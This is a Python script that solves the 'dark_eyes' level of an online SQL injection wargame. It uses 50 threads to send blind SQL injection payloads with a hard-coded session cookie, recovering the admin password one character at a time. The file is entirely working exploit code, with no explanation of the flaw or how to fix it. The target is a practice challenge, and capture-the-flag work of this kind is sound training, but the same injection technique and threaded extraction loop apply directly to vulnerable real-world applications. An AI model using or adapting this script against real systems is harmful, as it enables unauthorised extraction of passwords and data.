#!/usr/bin/env python
# -*- coding: utf8 -*-
import requests
import threading

key = {}
_string = "1234567890abcdefghijklmnopqrstuvwxyz"

def run(i):
	url = "https://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php"
	headers = {'Host': 'los.eagle-jump.org', 'Cookie': 'PHPSESSID=etgnhpi5bevt9oc4bsdtdkfg63;'}
	for s in _string:
		payload = "?pw='||id=\"admin\"%26%26(select substr(pw,{},1)=\"{}\" union select true)%23".format(i, s)
		r = requests.get(url + payload, headers=headers)
		if r.text.find("query") != -1:
			key[i] = s
			print("No.{} Found Key: {}".format(i, s))
			break

def main():
	threads = []
	threadNum = 50
	for count in range(threadNum):
		key[count] = "-"
		threads.append(threading.Thread(target = run, args = (count,)))
		threads[count].start()

	for count in range(threadNum):
		threads[count].join()

	print("Key:")
	for count in range(threadNum):
		if key[count] != "-":
			print(key[count], end='')

if __name__ == '__main__':
	main()